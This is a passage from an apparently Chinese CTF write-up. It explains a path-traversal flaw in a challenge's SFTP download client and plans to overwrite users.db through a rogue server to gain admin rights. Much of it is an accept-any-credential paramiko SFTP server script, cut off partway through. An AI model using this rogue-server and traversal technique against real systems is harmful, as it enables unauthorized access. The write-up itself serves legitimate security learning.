</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>hashedPassword</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>bcrypt</span><span class=p>.</span><span class=nx>hash</span><span class=p>(</span><span class=nx>password</span><span class=p>,</span> <span class=mi>10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>db</span><span class=p>.</span><span class=nx>run</span><span class=p>(</span>
</span></span><span class=line><span class=cl>      <span class=s1>&#39;INSERT INTO users (username, password) VALUES (?, ?)&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nx>username</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nx>hashedPassword</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>NextResponse</span><span class=p>.</span><span class=nx>json</span><span class=p>({</span> <span class=nx>success</span><span class=o>:</span> <span class=kc>true</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>e</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>NextResponse</span><span class=p>.</span><span class=nx>json</span><span class=p>(</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;User already exists&#39;</span> <span class=p>},</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span> <span class=nx>status</span><span class=o>:</span> <span class=mi>409</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>没有指定admin字段值. 也就是所有注册用户都为非admin,不能读取flag, 并且浏览附件发现默认并没有初始化一个admin账户. 所以就算下载到users.db也没有admin账户</p><p>思路是通过题目中的sftp文件下载, 让他去我们的恶意服务器上下载users.db并覆盖到原有的users.db, 这样就可以成功越权</p><p>客户端关键代码是这样的:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>export</span> <span class=k>default</span> <span class=kr>async</span> <span class=kd>function</span> <span class=nx>SSH_File_Download</span><span class=p>(</span><span class=nx>ctx</span><span class=o>:</span> <span class=nx>ssh_ctx</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=p>{</span> <span class=nx>host</span><span class=p>,</span> <span class=nx>username</span><span class=p>,</span> <span class=nx>filename</span><span class=p>,</span> <span class=nx>keyPath</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>ctx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>safeRemoteName</span> <span class=o>=</span> <span class=nx>basename</span><span class=p>(</span><span class=nx>filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>safeLocalName</span> <span class=o>=</span> <span class=nx>filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>hasBlockedExtension</span><span class=p>(</span><span class=nx>safeRemoteName</span><span class=p>)</span> <span class=o>||</span> <span class=nx>hasBlockedExtension</span><span class=p>(</span><span class=nx>safeLocalName</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>{</span> <span class=nx>ok</span><span class=o>:</span> <span class=kc>false</span><span class=p>,</span> <span class=nx>message</span><span class=o>:</span> <span class=s2>&#34;Refused: writing code files is not allowed.&#34;</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>fsp</span><span class=p>.</span><span class=nx>mkdir</span><span class=p>(</span><span class=s2>&#34;/app/downloads&#34;</span><span class=p>,</span> <span class=p>{</span> <span class=nx>recursive</span><span class=o>:</span> <span class=kc>true</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>_</span><span class=p>)</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>localPath</span> <span class=o>=</span> <span class=s2>&#34;/app/downloads/&#34;</span> <span class=o>+</span> <span class=nx>safeLocalName</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>remotePath</span> <span class=o>=</span> <span class=s2>&#34;/app/&#34;</span> <span class=o>+</span> <span class=nx>safeRemoteName</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>sftp</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Client</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>sftp</span><span class=p>.</span><span class=nx>connect</span><span class=p>({</span>
</span></span><span class=line><span class=cl>      <span class=nx>host</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nx>username</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nx>privateKey</span><span class=o>:</span> <span class=nx>fs</span><span class=p>.</span><span class=nx>readFileSync</span><span class=p>(</span><span class=nx>keyPath</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>sftp</span><span class=p>.</span><span class=nx>fastGet</span><span class=p>(</span><span class=nx>remotePath</span><span class=p>,</span> <span class=nx>localPath</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>sftp</span><span class=p>.</span><span class=nx>end</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=kr>await</span> <span class=nx>fsp</span><span class=p>.</span><span class=nx>chmod</span><span class=p>(</span><span class=nx>localPath</span><span class=p>,</span> <span class=mo>0o600</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>ok</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nx>message</span><span class=o>:</span> <span class=s2>&#34;Successfully downloaded the file&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nx>path</span><span class=o>:</span> <span class=nx>localPath</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>error</span><span class=o>:</span> <span class=nx>any</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=kr>await</span> <span class=nx>sftp</span><span class=p>.</span><span class=nx>end</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>{</span> <span class=nx>ok</span><span class=o>:</span> <span class=kc>false</span><span class=p>,</span> <span class=nx>message</span><span class=o>:</span> <span class=nx>error</span><span class=o>?</span><span class=p>.</span><span class=nx>message</span> <span class=o>||</span> <span class=s2>&#34;SFTP error&#34;</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>safeRemoteName</span> <span class=o>=</span> <span class=nx>basename</span><span class=p>(</span><span class=nx>filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>safeLocalName</span> <span class=o>=</span> <span class=nx>filename</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>客户端在将获取到的文件保存到本地时是可以目录穿越的, 所以就可以绕过后面的:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>localPath</span> <span class=o>=</span> <span class=s2>&#34;/app/downloads&#34;</span> <span class=o>+</span> <span class=s2>&#34;/&#34;</span> <span class=o>+</span><span class=nx>safeLocalName</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>将从服务端获取到的文件保存到客户端任意位置</p><p>由于进行了私钥验证, 此时就让ai写个服务端, 任何私钥都能通过验证:</p><p><code>fake_server.py</code>如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>paramiko</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 临时生成的 SSH host key</span>
</span></span><span class=line><span class=cl><span class=n>HOST_KEY</span> <span class=o>=</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>RSAKey</span><span class=o>.</span><span class=n>generate</span><span class=p>(</span><span class=mi>2048</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 工作目录，只允许访问这里的文件</span>
</span></span><span class=line><span class=cl><span class=n>WORK_DIR</span> <span class=o>=</span> <span class=s2>&#34;/app&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>AlwaysAllowServer</span><span class=p>(</span><span class=n>paramiko</span><span class=o>.</span><span class=n>ServerInterface</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;允许任何私钥/密码通过认证&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>check_channel_request</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>kind</span><span class=p>,</span> <span class=n>chanid</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>kind</span> <span class=o>==</span> <span class=s2>&#34;session&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>OPEN_SUCCEEDED</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>check_auth_publickey</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>username</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>AUTH_SUCCESSFUL</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>check_auth_password</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>username</span><span class=p>,</span> <span class=n>password</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>AUTH_SUCCESSFUL</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_allowed_auths</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>username</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;publickey,password&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>SimpleSFTPHandler</span><span class=p>(</span><span class=n>paramiko</span><span class=o>.</span><span class=n>SFTPServerInterface</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;SFTP 文件操作处理，只允许访问 WORK_DIR 下的文件&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>_to_local</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>path</span><span class=p>:</span> <span class=nb>str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>        将客户端传来的相对路径映射到 WORK_DIR
</span></span></span><span class=line><span class=cl><span class=s2>        拒绝访问 WORK_DIR 外的文件
</span></span></span><span class=line><span class=cl><span class=s2>        &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=c1># 移除开头的斜杠，确保是相对路径</span>
</span></span><span class=line><span class=cl>        <span class=n>relative_path</span> <span class=o>=</span> <span class=n>path</span><span class=o>.</span><span class=n>lstrip</span><span class=p>(</span><span class=s2>&#34;/</span><span class=se>\\</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>local_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>abspath</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>WORK_DIR</span><span class=p>,</span> <span class=n>relative_path</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 安全检查：必须在 WORK_DIR 内</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>local_path</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>abspath</span><span class=p>(</span><span class=n>WORK_DIR</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>            <span class=k>raise</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>SFTPNoSuchFile</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>local_path</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>list_folder</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>local_path</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>_to_local</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[SFTP] list_folder </span><span class=si>{</span><span class=n>path</span><span class=si>}</span><span class=s2> -&gt; </span><span class=si>{</span><span class=n>local_path</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>files</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>listdir</span><span class=p>(</span><span class=n>local_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>attrs</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>f</span> <span class=ow>in</span> <span class=n>files</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>st</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>stat</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>local_path</span><span class=p>,</span> <span class=n>f</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>attrs</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>paramiko</span><span class=o>.</span><span class=n>SFTPAttributes</span><span class=o>.</span><span class=n>from_stat</span><span class=p>(</span><span class=n>st</span><span class=p>,</span> <span class=n>filename</span><span class=o>=</span><span class=n>f</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>attrs</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>stat</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>local_path</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>_to_local</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[SFTP] stat </span><span class=si>{</span><span class=n>path</span><span class=si>}</span><span class=s2> -&gt; </span><span class=si>{</span><span class=n>local_path</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>st</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>stat</span><span class=p>(</span><span class=n>local_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>SFTPAttributes</span><span class=o>.</span><span class=n>from_stat</span><span class=p>(</span><span class=n>st</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>FileNotFoundError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>raise</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>SFTPNoSuchFile</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>lstat</span> <span class=o>=</span> <span class=n>stat</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>open</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>path</span><span class=p>,</span> <span class=n>flags</span><span class=p>,</span> <span class=n>attr</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>local_path</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>_to_local</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[SFTP] open </span><span class=si>{</span><span class=n>path</span><span class=si>}</span><span class=s2> -&gt; </span><span class=si>{</span><span class=n>local_path</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>mode</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>flags</span> <span class=o>&amp;</span> <span class=n>os</span><span class=o>.</span><span class=n>O_WRONLY</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>mode</span> <span class=o>=</span> <span class=s2>&#34;wb&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>flags</span> <span class=o>&amp;</span> <span class=n>os</span><span class=o>.</span><span class=n>O_RDWR</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>mode</span> <span class=o>=</span> <span class=s2>&#34;rb+&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>mode</span> <span class=o>=</span> <span class=s2>&#34;rb&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>local_path</span><span class=p>,</span> <span class=n>mode</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>FileNotFoundError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>raise</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>SFTPNoSuchFile</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>handle</span> <span class=o>=</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>SFTPHandle</span><span class=p>(</span><span class=n>flags</span><span class=o>=</span><span class=n>flags</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>handle</span><span class=o>.</span><span class=n>readfile</span> <span class=o>=</span> <span class=n>f</span> <span class=k>if</span> <span class=s2>&#34;r&#34;</span> <span class=ow>in</span> <span class=n>mode</span> <span class=k>else</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>        <span class=n>handle</span><span class=o>.</span><span class=n>writefile</span> <span class=o>=</span> <span class=n>f</span> <span class=k>if</span> <span class=s2>&#34;w&#34;</span> <span class=ow>in</span> <span class=n>mode</span> <span class=k>else</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>handle</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start_sftp_server</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s2>&#34;0.0.0.0&#34;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>22</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>setsockopt</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>SOL_SOCKET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SO_REUSEADDR</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>bind</span><span class=p>((</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>listen</span><span class=p>(</span><span class=mi>100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] SFTP server listening on </span><span class=si>{</span><span class=n>host</span><span class=si>}</span><span class=s2>:</span><span class=si>{</span><span class=n>port</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>client</span><span class=p>,</span> <span class=n>addr</span> <span class=o>=</span> <span class=n>sock</span><span class=o>.</span><span class=n>accept</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Connection from </span><span class=si>{</span><span class=n>addr</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>t</span> <span class=o>=</span> <span class=n>paramiko</span><span class=o>.</span><span class=n>Transport</span><span class=p>(</span><span class=n>client</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span><span class=o>.</span><span class=n>add_server_key</span><span class=p>(</span><span class=n>HOST_KEY</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>server</span> <span class=o>=</span> <span class=n>AlwaysAllowServer</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
